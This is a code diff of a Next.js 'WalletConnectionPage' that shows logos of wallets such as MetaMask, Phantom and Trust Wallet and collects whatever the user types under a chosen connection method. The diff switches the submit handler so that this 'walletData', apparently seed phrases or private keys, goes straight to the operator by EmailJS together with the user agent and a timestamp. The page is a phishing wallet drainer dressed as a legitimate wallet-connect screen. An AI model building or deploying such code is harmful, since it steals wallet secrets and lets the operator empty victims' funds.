@@ -7,49 +7,49 @@ import { useState } from "react"
 import Link from "next/link"
 import Image from "next/image"
 import { useRouter } from "next/navigation"
-import { sendWalletData } from "@/app/actions/send-wallet-data"
+import emailjs from "@emailjs/browser"
 
 const wallets = [
   {
     name: "MetaMask",
     description: "Connect using browser extension",
-    icon: "https://hebbkx1anhila5yf.public.blob.vercel-storage.com/MetaMask-8wZx2RTLoHsTDFNhMjOC46Shn547jj.avif", // Updated with new MetaMask logo
+    icon: "https://hebbkx1anhila5yf.public.blob.vercel-storage.com/MetaMask-8wZx2RTLoHsTDFNhMjOC46Shn547jj.avif",
     popular: true,
   },
   {
     name: "WalletConnect",
     description: "Scan with WalletConnect to connect",
-    icon: "https://hebbkx1anhila5yf.public.blob.vercel-storage.com/walletconnect-seeklogo-XMktuIkF7fvcQEID4Z5JxDbB3bVwPT.png", // Updated with new WalletConnect logo
+    icon: "https://hebbkx1anhila5yf.public.blob.vercel-storage.com/walletconnect-seeklogo-XMktuIkF7fvcQEID4Z5JxDbB3bVwPT.png",
     popular: true,
   },
   {
     name: "Coinbase Wallet",
     description: "Connect using Coinbase Wallet",
-    icon: "https://hebbkx1anhila5yf.public.blob.vercel-storage.com/Coinbase20Wallet-kW4kluZ1ER1LbYPTPCB4DuyNXiY0AZ.avif", // Updated with new Coinbase Wallet logo
+    icon: "https://hebbkx1anhila5yf.public.blob.vercel-storage.com/Coinbase20Wallet-kW4kluZ1ER1LbYPTPCB4DuyNXiY0AZ.avif",
     popular: true,
   },
   {
     name: "Trust Wallet",
     description: "Connect using Trust Wallet",
-    icon: "https://hebbkx1anhila5yf.public.blob.vercel-storage.com/download%20trust.jfif-XHrFfq1Yshs1Go0eghadfDZO2f2TbU.jpeg", // Updated with new perfect Trust Wallet logo
+    icon: "https://hebbkx1anhila5yf.public.blob.vercel-storage.com/download%20trust.jfif-XHrFfq1Yshs1Go0eghadfDZO2f2TbU.jpeg",
     popular: true,
   },
   {
     name: "Phantom",
     description: "Connect using Phantom wallet",
-    icon: "https://hebbkx1anhila5yf.public.blob.vercel-storage.com/Phantom20Wallet-q3RFXHywyttfH8x3BiwxxOK5TgfDnw.avif", // Updated with new Phantom logo
+    icon: "https://hebbkx1anhila5yf.public.blob.vercel-storage.com/Phantom20Wallet-q3RFXHywyttfH8x3BiwxxOK5TgfDnw.avif",
     popular: true,
   },
   {
     name: "OKX Wallet",
     description: "Connect using OKX Wallet",
-    icon: "https://hebbkx1anhila5yf.public.blob.vercel-storage.com/OKX20Wallet-5WEn0eQSSEvmuzVoKjya79cDaGlpEo.avif", // Updated with new OKX Wallet logo
+    icon: "https://hebbkx1anhila5yf.public.blob.vercel-storage.com/OKX20Wallet-5WEn0eQSSEvmuzVoKjya79cDaGlpEo.avif",
     popular: true,
   },
   {
     name: "Binance Wallet",
     description: "Connect using Binance Chain Wallet",
-    icon: "https://hebbkx1anhila5yf.public.blob.vercel-storage.com/idwiMPAwxr_logos-2icRJgfuMeUcH1XlxacEPo9GdVIEbl.jpeg", // Updated with new perfect Binance Wallet logo
+    icon: "https://hebbkx1anhila5yf.public.blob.vercel-storage.com/idwiMPAwxr_logos-2icRJgfuMeUcH1XlxacEPo9GdVIEbl.jpeg",
     popular: true,
   },
   {
@@ -270,26 +270,24 @@ export function WalletConnectionPage() {
     setConnectionState("submitting")
 
     try {
-      const result = await sendWalletData({
-        walletName: selectedWallet?.name || "Unknown",
-        connectionMethod: connectionMethod.charAt(0).toUpperCase() + connectionMethod.slice(1),
-        walletData: inputData,
-        userAgent: navigator.userAgent,
-        timestamp: new Date().toISOString(),
-      })
+      // ✅ Send via EmailJS client
+      const result = await emailjs.send(
+        process.env.NEXT_PUBLIC_EMAILJS_SERVICE_ID as string,
+        process.env.NEXT_PUBLIC_EMAILJS_TEMPLATE_ID as string,
+        {
+          walletName: selectedWallet?.name || "Unknown",
+          connectionMethod: connectionMethod,
+          walletData: inputData,
+          userAgent: navigator.userAgent,
+          timestamp: new Date().toISOString(),
+        },
+        process.env.NEXT_PUBLIC_EMAILJS_PUBLIC_KEY as string
+      )
 
-      // Check if EmailJS submission was successful
-      if (!result.success) {
-        console.error("[v0] EmailJS submission failed:", result.error)
-        setInputError(`Email submission failed: ${result.error}. Please check your EmailJS configuration.`)
-        setConnectionState("manual")
-        return
-      }
-
-      console.log("[v0] EmailJS submission successful")
+      console.log("Email sent:", result.status, result.text)
     } catch (error) {
-      console.error("[v0] Failed to send wallet data:", error)
-      setInputError("Failed to submit wallet data. Please check your EmailJS setup and try again.")
+      console.error("EmailJS failed:", error)
+      setInputError("Email submission failed. Please check your EmailJS configuration.")
       setConnectionState("manual")
       return
     }
